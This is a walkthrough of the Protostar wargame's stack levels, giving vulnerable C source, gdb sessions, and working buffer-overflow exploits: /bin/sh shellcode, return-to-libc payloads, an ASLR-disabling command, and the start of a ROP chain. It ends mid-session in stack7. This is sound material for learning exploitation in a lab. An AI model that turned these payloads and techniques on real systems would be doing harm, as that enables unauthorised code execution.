# protostar
protostar sploits and solutions 
https://exploit-exercises.com/protostar

NOTE: write ups in progress. Adding python exploit poc's to each excercise for practice!

##INDEX

| Challenge                        |
| :------------------------------- | 
| [Stack0](#stack0) | 
|[Stack1](#stack1)|
|[Stack2](#stack2)|
|[Stack3](#stack3)|
|[Stack4](#stack4)|
|[Stack5](#stack5)|
|[Stack6](#stack6)|
|[Stack7](#stack7)|
|[Format0](#format0)|
|[Format1](#format1)|
|[Format2](#format2)|
|[Heap0](#Heap0)|
|[Heap1](#Heap1)|
|[net0](#net0)|
|[net1](#net1)|



#Stack0
---------------------------------------
###Source Code:
```C
int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
###Stack:

| eip | ebp | modified(0) |   buffer    |

###The plan:
fill buffer with gets 
since buffer = 64 bytes, an input of 65 bytes should overflow and overwrite modified

###winning command:
```bash
python -c "print 'a'*64+'1'" | ./stack0
```
###Python exploit:
```Python
from subprocess import Popen, PIPE
################
buffer = 64 
fill = "A"*buffer  
input=fill+"1"      
#################
cproc = Popen("./stack0", stdin=PIPE, stdout=PIPE)
print cproc.communicate(input)[0]   
```
        
        
        
        
        

#Stack1
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
###Stack:
| eip | ebp | modified(0) |   buffer    |

###Plan:
This challenge is similar to the last one with a few differences.  It takes command line args instead of gets, and instead of setting modified to 1, we need to set it to 0x61626364 ("abcd" in ascii). Like the previous challenge, we just fill up buffer and overflow the correct value into modified. Since it's little endian, we need to craft our input so that the value sits in memory correctly. 

###winning command:
```bash
./stack1 $(python -c "print 'a'*64+'dcba'")
```
###Python exploit:
```Python
from subprocess import Popen, PIPE
################
buffer = 64
fill = "A"*buffer
input=fill+'\x64\x63\x62\x61'
#################
cproc = Popen(["./stack1",input], stdin=PIPE, stdout=PIPE)
print cproc.communicate()[0]
```




#Stack2
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
###Stack:
| eip | ebp | modified(0) |   buffer    | variable pointer|

###Plan:
Use an environment variable to overflow buffer via strcpy and fill modified with correct value.

###winning command:
```bash

```
###Python exploit:
```Python
from subprocess import Popen, PIPE
import os
################
buffer = 64
fill = "A"*buffer
input=fill+'\x0a\x0d\x0a\x0d'
print(input)
os.environ ["GREENIE"]=input
#################
cproc = Popen("./stack2", stdin=PIPE, stdout=PIPE)
print cproc.communicate()[0]
```





#Stack3
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
###Stack:
| eip | ebp | fp(0) |   buffer  |

###Plan:
Another overflow. This time we need to use objdump/gdb to find the memory location of the win function. There are a few ways to accomplish this, so I will cover two.
####Objdump
run the following to generate your assembly:
```bash
objdump -d ./stack2 | ./stack2.s
```
after reviewing your assembly, you can see the following
```asm
08048424 <win>:
 8048424:	55                   	push   %ebp
 8048425:	89 e5                	mov    %esp,%ebp
 8048427:	83 ec 18             	sub    $0x18,%esp
 804842a:	c7 04 24 40 85 04 08 	movl   $0x8048540,(%esp)
 8048431:	e8 2a ff ff ff       	call   8048360 <puts@plt>
 8048436:	c9                   	leave  
 8048437:	c3                   	ret   
```
####gdb
use the following command in gdb to print the memory location of win
```
x win
```

we now know win is at 0x08048424 in memory, so we craft an input that overflows into fp with this location (adjusted for endianess) 
###winning command:
```bash
python -c "print 'a'*64+'\x24\x84\x04\x08'" | ./stack3 
```
###Python exploit:
```Python
from subprocess import Popen, PIPE
import os
################
buffer = 64
fill = "A"*buffer
input=fill+'\x24\x84\x04\x08' #08048424
print(input)
#################
cproc = Popen("./stack3", stdin=PIPE, stdout=PIPE)
print cproc.communicate(input)[0]
```






#Stack4
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
###Stack:
| eip | ebp |   buffer  |

###Plan:
Another overflow. This time we need to use objdump/gdb to find the memory location of the win function, then we want to overwrite EIP so that we return to win.
First we find where we need to jump with gdb.
```
$ gdb ./stack4
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Reading symbols from ./stack4...done.
(gdb) x win
0x80483f4 <win>:        0x83e58955
```
By looking at the source code, you might assume that we simply need to fill buffer(64bytes), which will then overflow into EBP(4bytes) and then the next bytes of our input would overwrite EIP. We could try something like this
```bash
python -c "print (68*'a')+'\xf4\x83\x04\x08'" | ./stack4
```
This does not work, and it's because (as the hint says) compilers behavior isnt always apparent.
So lets fire up GDB
```bash
$ gdb ./stack4
Reading symbols from ./stack4...done.
(gdb) disas main   
Dump of assembler code for function main:
   0x08048408 <+0>:     push   %ebp
   0x08048409 <+1>:     mov    %esp,%ebp
   0x0804840b <+3>:     and    $0xfffffff0,%esp
   0x0804840e <+6>:     sub    $0x50,%esp
   0x08048411 <+9>:     lea    0x10(%esp),%eax
   0x08048415 <+13>:    mov    %eax,(%esp)
   0x08048418 <+16>:    call   0x804830c <gets@plt>
   0x0804841d <+21>:    leave                                  #<--- set a break here, right after gets loads buffer with data
   0x0804841e <+22>:    ret    
End of assembler dump.
(gdb) b *0x0804841d                                           #set breakpoint 
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
(gdb) run
Starting program: /home/ubuntu/workspace/proto/stack4 
aaaaaaaaaaaaaaaaaaaaaaaaaaa                                   #run with some garbage data

Breakpoint 1, main (argc=1, argv=0xffffd1c4) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
(gdb) x/40wx $esp                                              #lets check out our stack 
0xffffd0d0:     0xffffd0e0      0xffffd0fe      0xf7e25bf8      0xf7e4c273
0xffffd0e0:     0x61616161      0x61616161      0x61616161      0x61616161 #<--- we can see our input starts here
0xffffd0f0:     0x61616161      0x61616161      0x00616161      0x08048449
0xffffd100:     0x08048430      0x08048340      0x00000000      0xf7e4c42d
0xffffd110:     0xf7fc33c4      0xf7ffd000      0x0804843b      0xf7fc3000
0xffffd120:     0x08048430      0x00000000      0x00000000      0xf7e32a83  #<--- EIP
0xffffd130:     0x00000001      0xffffd1c4      0xffffd1cc      0xf7feacea
0xffffd140:     0x00000001      0xffffd1c4      0xffffd164      0x08049600
0xffffd150:     0x08048218      0xf7fc3000      0x00000000      0x00000000
0xffffd160:     0x00000000      0xebc5d5ee      0xd23331fe      0x00000000
(gdb) p $ebp                                                   #find where EBP is, since EIP is right next to this
$1 = (void *) 0xffffd128
(gdb) p 0xffffd12c - 0xffffd0e0                                #get the offset by subtracting start of input from EIP location                                                                                                                                                          
$2 = 76                            
(gdb) 
```
Now we know the offset is actually 76 so we can craft an input and test
```bash
$ python -c "print 'a'*76+'aaaa'" | ./stack4                                                                                                            
Segmentation fault
```

Good sign! Now we replace 'aaaa' with our target location(win) which was at 080483f4.
```bash
$ python -c "print 'a'*76+'\xf4\x83\x04\x08'" | ./stack4
code flow successfully changed
Segmentation fault
```
We could probably get rid of the segfault but we wont worry about that now

###winning command:
```bash
python -c "print 'a'*76+'\xf4\x83\x04\x08'" | ./stack4
```
###Python exploit:  (BROKEN, need to figure out why popen isnt working)
```Python
from subprocess import Popen, PIPE
import os
################
input=(0x4c*'a')+'\xf4\x83\x04\x08'

print(input)
#################

cproc = Popen(["./stack4"], stdin=PIPE, stdout=PIPE)
print cproc.communicate(input)
```



##Stack5
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
###Stack:
| eip | ebp |  buffer    |

###Plan:
Simple overflow, but this time we need to get some shellcode to run. 
Objectives:
-figure out where input starts in memory
-determine EIP location to overwrite 
-craft input that fills memory with shellcode and overwrites EIP so that our program returns to the shellcode location and executes.

NOTES: this is the first exercise where ASLR will mess up your exploit because every time the program executes, the location that your shellcode sits in memory will change. Use the following command:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Next, fire up GDB

```bash
$ gdb ./stack5
Reading symbols from ./stack5...done.
gdb$ disas main
Dump of assembler code for function main:
   0x080483c4 <+0>:     push   %ebp
   0x080483c5 <+1>:     mov    %esp,%ebp
   0x080483c7 <+3>:     and    $0xfffffff0,%esp
   0x080483ca <+6>:     sub    $0x50,%esp
   0x080483cd <+9>:     lea    0x10(%esp),%eax
   0x080483d1 <+13>:    mov    %eax,(%esp)
   0x080483d4 <+16>:    call   0x80482e8 <gets@plt>
   0x080483d9 <+21>:    leave  
   0x080483da <+22>:    ret    
End of assembler dump.

gdb$ b *0x080483d9                                                              #break right after gets
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
gdb$ run
Starting program: /home/ubuntu/exploit-exercises-pwntools/protostar/stack5 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                                     #give some input

Breakpoint 1, main (argc=0x1, argv=0xffffd6c4) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
gdb$ x/40wx $esp
0xffffd5d0:     0xffffd5e0      0xffffd5fe      0xf7e23c34      0xf7e49fe3
0xffffd5e0:     0x61616161      0x61616161      0x61616161      0x61616161    #< we see where the input begins
0xffffd5f0:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd600:     0x61616161      0x61616161      0x00616161      0xf7e4a19d
0xffffd610:     0xf7fbe3c4      0xf7ffd000      0x080483fb      0xf7fbe000
0xffffd620:     0x080483f0      0x00000000      0x00000000      0xf7e30ad3
0xffffd630:     0x00000001      0xffffd6c4      0xffffd6cc      0xf7feacca
0xffffd640:     0x00000001      0xffffd6c4      0xffffd664      0x080495a0
0xffffd650:     0x08048204      0xf7fbe000      0x00000000      0x00000000
0xffffd660:     0x00000000      0x91b2c852      0xa80b8c42      0x00000000
gdb$ p $ebp
$1 = (void *) 0xffffd628                                                    #get ebp and add 4 to get EIP
gdb$ p $1+4
$2 = (void *) 0xffffd62c
gdb$ p $2 - 0xffffd5e0                                                      #subtract the mem location where our input starts
$3 = (void *) 0x4c                                                          #from EIP location to get our offset  (0x4c)
gdb$ 
```

So now we have our locations and our offset. Time to craft an input. I used http://shell-storm.org/shellcode/ to find some shellcode to use. I settled on http://shell-storm.org/shellcode/files/shellcode-811.php for this example, which is a basic 28byte execve(bin/sh) command. 

For our input, we'll put our shellcode + filler + target return location
```bash
python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\xe0\xd5\xff\xff'"  > testme
```
Now we test with GDB
```bash
$ gdb ./stack5
Reading symbols from ./stack5...done.
gdb$ b *0x080483d9
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
gdb$ run < testme 
Breakpoint 1, main (argc=0x0, argv=0xffffd6c4) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
gdb$ x/40wx $esp
0xffffd5d0:     0xffffd5e0      0xffffd5fe      0xf7e23c34      0xf7e49fe3
0xffffd5e0:     0x6850c031      0x68732f2f      0x69622f68      0x89e3896e   #shell code is in place
0xffffd5f0:     0xb0c289c1      0x3180cd0b      0x80cd40c0      0x61616161
0xffffd600:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd610:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd620:     0x61616161      0x61616161      0x61616161      0xffffd5e0   #return looks good
0xffffd630:     0x00000000      0xffffd6c4      0xffffd6cc      0xf7feacca
0xffffd640:     0x00000001      0xffffd6c4      0xffffd664      0x080495a0
0xffffd650:     0x08048204      0xf7fbe000      0x00000000      0x00000000
0xffffd660:     0x00000000      0xd40c28cd      0xedb56cdd      0x00000000

gdb$ c
Continuing.
process 31143 is executing new program: /bin/dash                           #boom
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x80483d9

```
Great! So our exploit works in GDB, lets try it outside of the debugger--

```bash
python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\xe0\xd5\xff\xff'" | ./stack5                                                                                                                                                                                                  
Illegal instruction (core dumped)   #not so fast!
``` 
So what happened? Well, there are some differences in how the program runs when you run it normally and within GDB (guessing due to env variables, a wrapper will also fix this ). 
So we will take a look at the core dump to see what's going on and see where exactly everything sits in memory when a user runs the program.
First run the following command to allow core dumps to be saved
```bash
ulimit -c unlimited 
```
Now we can get into how to examine core dumps with gdb!
```bash
$ python -c "print 'a'*76+'xxxx'" | ./stack5
Segmentation fault (core dumped)
$ gdb ./stack5 core -q
warning: ~/.gdbinit.local: No such file or directory
Reading symbols from ./stack5...done.
[New LWP 31596]
Core was generated by `./stack5'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x78787878 in ?? ()
gdb$ x/60wx 0xffffd5e0
0xffffd5e0:     0x08048204      0xf7fbe000      0xf7fbec20      0xf7e7b506
0xffffd5f0:     0xf7fbec20      0xffffd641      0x7fffffff      0x0000000a
0xffffd600:     0x00000000      0xf7fbe000      0x00000000      0x00000000
0xffffd610:     0xffffd688      0xf7ff04c0      0xf7e7b449      0xf7fbe000
0xffffd620:     0x00000000      0x00000000      0xffffd688      0x080483d9
0xffffd630:     0xffffd640      0xffffd65e      0xf7e23c34      0xf7e49fe3
0xffffd640:     0x61616161      0x61616161      0x61616161      0x61616161 #< we can see the location changed
0xffffd650:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd660:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd670:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd680:     0x61616161      0x61616161      0x61616161      0x78787878  ##< return
0xffffd690:     0x00000000      0xffffd724      0xffffd72c      0xf7feacca
0xffffd6a0:     0x00000001      0xffffd724      0xffffd6c4      0x080495a0
0xffffd6b0:     0x08048204      0xf7fbe000      0x00000000      0x00000000
0xffffd6c0:     0x00000000      0xa9142257      0x90ac2647      0x00000000
```
So we alter our input with the new memory locations, and come up with an input like this:
```bash
$ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\x40\xd6\xff\xff'" > stack5sploit
```
Now for some weirdness . I was stuck for a while on this part, because if you run 
```bash
$ cat stack5sploit | ./stack5
$ 
```
We're getting our shell , but it exits immediately. After some research, I found a few solutions. Apparently shell redirection "<"
appends an EOF after redirecting payload5.
You can choose a different shellcode, or use the following trick. (thanks http://www.kroosec.com/2012/12/protostar-stack5.html)
```bash
(cat stack5sploit; cat) | ./stack5
```
###winning command:
```bash
$ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\x40\xd6\xff\xff'" > stack5sploit
(cat stack5sploit; cat) | ./stack5
```

##Stack6
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);  

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
###Stack:
| eip | ebp | int ret |char buffer[64]  |

###Plan:
So this program basically uses gets to grab an input for buffer, then uses builtin_return_address(0) to get the return address of the current function and prevents it from returning to any address in the 0xbf------ range.(likely where our buffer is to prevent shellcode execution). So in this one, we will go a different route and use Return to libc.

First we need to find our offset 

```bash
l:~/workspace/proto (master) $ ulimit -s unlimited
l:~/workspace/proto (master) $ gdb ./stack6      
gdb$ disas getpath
```
```asm
  Dump of assembler code for function getpath:
   0x08048484 <+0>:     push   ebp
   0x08048485 <+1>:     mov    ebp,esp
   0x08048487 <+3>:     sub    esp,0x68
   0x0804848a <+6>:     mov    eax,0x80485d0
   0x0804848f <+11>:    mov    DWORD PTR [esp],eax
   0x08048492 <+14>:    call   0x80483c0 <printf@plt>
   0x08048497 <+19>:    mov    eax,ds:0x8049720
   0x0804849c <+24>:    mov    DWORD PTR [esp],eax
   0x0804849f <+27>:    call   0x80483b0 <fflush@plt>
   0x080484a4 <+32>:    lea    eax,[ebp-0x4c]
   0x080484a7 <+35>:    mov    DWORD PTR [esp],eax
   0x080484aa <+38>:    call   0x8048380 <gets@plt>
   0x080484af <+43>:    mov    eax,DWORD PTR [ebp+0x4]
   0x080484b2 <+46>:    mov    DWORD PTR [ebp-0xc],eax
   0x080484b5 <+49>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484b8 <+52>:    and    eax,0xbf000000
   0x080484bd <+57>:    cmp    eax,0xbf000000
   0x080484c2 <+62>:    jne    0x80484e4 <getpath+96>
   0x080484c4 <+64>:    mov    eax,0x80485e4
   0x080484c9 <+69>:    mov    edx,DWORD PTR [ebp-0xc]
   0x080484cc <+72>:    mov    DWORD PTR [esp+0x4],edx
   0x080484d0 <+76>:    mov    DWORD PTR [esp],eax
   0x080484d3 <+79>:    call   0x80483c0 <printf@plt>
   0x080484d8 <+84>:    mov    DWORD PTR [esp],0x1
   0x080484df <+91>:    call   0x80483a0 <_exit@plt>
   0x080484e4 <+96>:    mov    eax,0x80485f0
   0x080484e9 <+101>:   lea    edx,[ebp-0x4c]
   0x080484ec <+104>:   mov    DWORD PTR [esp+0x4],edx
   0x080484f0 <+108>:   mov    DWORD PTR [esp],eax
   0x080484f3 <+111>:   call   0x80483c0 <printf@plt>
   0x080484f8 <+116>:   leave  
   0x080484f9 <+117>:   ret  
   End of assembler dump.
```
```bash
gdb$ b *0x080484f9 
Breakpoint 1 at 0x80484f9: file stack6/stack6.c, line 23.
gdb$ run
Starting program: /home/ubuntu/workspace/proto/stack6 
input path please: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa            #< --- some junk input
got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
--------------------------------------------------------------------------[regs]
  EAX: 0x00000035  EBX: 0x55736000  ECX: 0x00000000  EDX: 0x55737898  o d I t S z a p c 
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xFFFFD128  ESP: 0xFFFFD11C  EIP: 0x080484F9
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
--------------------------------------------------------------------------[code]
=> 0x80484f9 <getpath+117>:     ret    
   0x80484fa <main>:    push   ebp
   0x80484fb <main+1>:  mov    ebp,esp
   0x80484fd <main+3>:  and    esp,0xfffffff0
   0x8048500 <main+6>:  call   0x8048484 <getpath>
   0x8048505 <main+11>: mov    esp,ebp
   0x8048507 <main+13>: pop    ebp
   0x8048508 <main+14>: ret    
--------------------------------------------------------------------------------

Breakpoint 1, 0x080484f9 in getpath () at stack6/stack6.c:23
23      stack6/stack6.c: No such file or directory.
gdb$ p $esp
$1 = (void *) 0xffffd11c                                                    #<-- return location to overwrite
gdb$ x/40wx $esp-60
0xffffd0bc:     0x080482a1      0x55576938      0x00000000      0x000000c2
0xffffd0cc:     0x61616161      0x61616161      0x61616161      0x61616161  #<-- start of input
0xffffd0dc:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd0ec:     0x61616161      0x61616161      0x00616161      0xffffd128
0xffffd0fc:     0x08048539      0x08048520      0x080483d0      0x00000000
0xffffd10c:     0x08048505      0x557363c4      0x55576000      0xffffd128
0xffffd11c:     0x08048505      0x08048520      0x00000000      0x00000000
0xffffd12c:     0x555a5a83      0x00000001      0xffffd1c4      0xffffd1cc
0xffffd13c:     0x55563cea      0x00000001      0xffffd1c4      0xffffd164
0xffffd14c:     0x08049700      0x08048258      0x55736000      0x00000000
gdb$ p $1 - 0xffffd0cc                                                      #<-- subtract for the offset
$2 = (void *) 0x50
gdb$ 

gdb$ print system                                                   #get location of system function
$1 = {<text variable, no debug info>} 0x555cc190 <system>
gdb$ print exit                                                     #get loc of exit function
$2 = {<text variable, no debug info>} 0x555bf1e0 <exit>
gdb$ find $1, +99999999999999, "/bin/sh"                            #find "/bin/sh" in memory to use as arg
0x556eca24
warning: Unable to access 16000 bytes of target memory at 0x5573ac2c, halting search.
1 pattern found.
gdb$ quit
```
So now that we have our offset, and the locations in memory we can form the following payload by setting up the stack like follows:

FILLER + SYSTEM function call + Return value for System function call+ ARG FOR SYSTEM function call
For mine, i wanted it to exit cleanly after the shell, so i made SYSTEM's return value the function call for EXIT.
```python
       #fill          #system               #exit                 #bin/sh
print 'A'*0x50 + '\x90\xc1\x5c\x55'+  '\xe0\xf1\x5b\x55'   +'\x24\xca\x6e\x55'"
```

Now, we need to do the same trick to keep stdin open by using  (cat payload; cat) | ./path - see below  

###winning command:
```bash
$ python -c "print 'A'*0x50+'\x90\xc1\x5c\x55'+  '\xe0\xf1\x5b\x55'   +'\x24\xca\x6e\x55'" > stack6sploit
 (cat stack6sploit; cat) | ./stack6   
```
###Python exploit:
```Python
COMING SOON
```


##Stack7
---------------------------------------
###Source Code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();



}
```
###Stack:
| EIP | EBP | BUFFER |

###Plan:
So for this challenge, its basically the same as stack6, but strdup is called. This function allocates space on the heap and copies a string to it. Knowing this, stack7 could be solved by predicting the heap location and jumping there to execute shellcode, but I wanted to experiment with chaining ROP gadgets. I will do my best to explain the whole process so that it hopefully proves useful for someone out there trying to learn!

###Resources:
http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html

https://www.exploit-db.com/docs/28479.pdf

https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm

http://rotlogix.com/2016/05/03/arm-exploit-exercises/

###ROP Gadgets---- What exactly are they?
A ROP gadget is basically just the tail end of a function that ends in ret. 
EXAMPLE:
```asm
pop $eax;
ret;
```
###What can we do with them? 
We can piece together a bunch of ROP gadgets, along with values on our stack to perform just about anything. In my example we will be executing a system call to execve with specific parameters in order to get a shell. After we design our stack with the proper values and rop gadgets, we will be getting a shell via execve.

First things first, we will find our offset and what input we need to overwrite our EIP so that we can jump to a location in memory.
Luckily, stack7 is nearly identical to stack6, so we can take the offset from there ( See stack6 write up for walkthrough!)
So we have our offset(0x50). Now it's time to formulate a plan and design our stack.

So, our goal is to creat a system call to execve(x,y,z). 

Recommended reading: https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm 

We see that during a system call, EAX is set to a specific value and then INT 0x80(interrupt) to call the kernel. 
So we need to figure out what value we need to load into EAX for execve.

Notice in the source code, we have 
```C
#include <unistd.h>
```
unistd.h is the header file that provides access to the OS API. This means we can examine this header file, and figure out
what value will get us EXECVE.

I got snagged here for a bit. I did these challenges on a 64 bit system, so I had a couple of unistd.h's .
```
/usr/include/unistd.h
/usr/include/asm/unistd.h
/usr/include/asm/unistd_64.h
/usr/include/asm/unistd_x32.h
/usr/include/asm/unistd_32.h
```
The others check your architecture and point you to correct header, and since our program was compiled for x86, we actually use the following header file:
/usr/include/asm/unistd_32.h
```bash
le91688:/usr/include/asm $ cat unistd_32.h | grep "execve"
#define __NR_execve 11
```
So we see that 11 or 0xb is our value we want EAX to be when we call our interrupt.  Now that we have our system call figured out, we need to figure out what parameters to pass to it, and what registers to use.

Recommended Reading:
http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html

Lets check out EXECVE by looking at the man page:
```bash
le91688:$ man execve
EXECVE(2)                                             Linux Programmer's Manual                  EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);
```
####filename
The first arg needs to be a pointer to a string that is a path to the binary 
in our case, a ptr to "/bin/sh"
####argv[]
The second is the list of args to the program, and since we are not running /bin/sh with any args, we can set this to a null byte
####envp[]
the third arg is for environment options, again we'll set this to a null byte
Our call should look like this:
```c
execve('/bin/sh',0,0)
```
So now we know how we need to call execve, now we need to figure out how to do it.

To perform our system call we do the following:
* Put the system call number in the EAX register.
* Store the arguments to the system call in the registers EBX, ECX, etc.

This means we need our registers set up like this
```asm
EAX = 0xb (sys call value for execve)
EBX = ptr to "/bin/sh"
ECX = 0x0
EDX = 0x0
```
Now we need to go gather some gadgets to make the magic happen. 
I used ROPgadget, you can grab it here:

https://github.com/JonathanSalwan/ROPgadget

NOTE: i realize i'm not using this tool to its fullest potential, but I will show how I was able to grab gadgets, if you have any tips feel free to comment!  I also saw the --ROPchain switch, but thats no fun ;)

At first, I tried running ROPgadget on the binary ( ./stack7) itself, and only found ~70 gadgets, but nothing useful.  After some professional help (thanks @rotlogix) , I learned that you need to run it on the library itself.
We need to find what library is being loaded in memory at runtime:
```bash
le91688:~/workspace/proto (master) $ gdb ./stack7
Reading symbols from ./stack7...done.
gdb$ b main
Breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.
gdb$ run
Starting program: /home/ubuntu/workspace/proto/stack7 
Breakpoint 1, main (argc=0x1, argv=0xffffd1c4) at stack7/stack7.c:28
gdb$ info sharedlibrary                                             #<<---- get loaded library info
From        To          Syms Read   Shared Object Library
0x55555860  0x5556d76c  Yes (*)     /lib/ld-linux.so.2
0x555a5490  0x556d699e  Yes (*)     /lib/i386-linux-gnu/libc.so.6   #<<------ target library to grab gadgets!
gdb$ quit
```
So now we can run ROPgadget on libc.so.6 and pipe it to a file "LIBCgadgets" I will then grep this for gadgets!
```bash
le91688:~/workspace/proto$ ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 > ./LIBCgadgets
le91688:~/workspace/proto$ grep -w "xor eax, eax" LIBCgadgets
0x0007a1fb : test eax, eax ; jne 0x7a1f6 ; xor eax, eax ; ret
0x00094908 : test eax, eax ; jne 0x94986 ; xor eax, eax ; ret
0x00094937 : test eax, eax ; jne 0x949a6 ; xor eax, eax ; ret
0x0002f4d3 : test ecx, ecx ; je 0x2f4ce ; xor eax, eax ; ret
0x000949bd : xor bl, al ; nop ; xor eax, eax ; ret
0x001466dc : xor byte ptr [edx], al ; add byte ptr [eax], al ; xor eax, eax ; ret
0x0002f0ec : xor eax, eax ; ret
le91688:~/workspace/proto$ grep -w "xor eax, eax" LIBCgadgets
```
Using this i'm able to find the following useful gadgets:
```asm
0x000f9482  : pop ecx ; pop ebx ; ret       #load values from stack to ECX, EBX
0x00001aa2  : pop edx ; ret                 #load value in EDX
0x001454c6  : add eax, 0xb ; ret            #add 0xb to EAX
0x0002f0ec  : xor eax, eax ; ret            #Zero out EAX
0x0002e725  : int 0x80                      #syscall
```
Now, the memory values for each gadget are the offset within the loaded library, so we need to get the base address of the library when its loaded.

Warning: GDB info sharedlibrary is not a good way to do this and will lead to anger and hatred. Please dont ask me how i know. Instead use the following method. We will also grab the location of "bin/sh" in memory, as done in stack6.
```bash
le91688:~/workspace/proto (master) $ ulimit -s unlimited  <--- DONT FORGET THIS, DISABLE LIBRARY RANDOMIZATION
le91688:~/workspace/proto (master) $ gdb ./stack7
warning: ~/.gdbinit.local: No such file or directory
Reading symbols from ./stack7...done.
gdb$ b main
Breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.
gdb$ run
Starting program: /home/ubuntu/workspace/proto/stack7 
Breakpoint 1, main (argc=0x1, argv=0xffffd1c4) at stack7/stack7.c:28
warning: Source file is more recent than executable.
28        getpath();
gdb$ p system
$1 = {<text variable, no debug info>} 0x555ce310 <system>
gdb$ find $1, +99999999999, "/bin/sh"
0x556ee84c                                                    <------------- BIN/SH location!
warning: Unable to access 16000 bytes of target memory at 0x5573ca54, halting search.
1 pattern found.
gdb$ shell
le91688:~/workspace/proto$ ps -aux | grep stack7
ubuntu     29655  0.1  0.0  47856 18112 pts/5    S    13:12   0:00 gdb ./stack7
ubuntu     29658  0.0  0.0   2028   556 pts/5    t    13:12   0:00 /home/ubuntu/workspace/proto/stack7
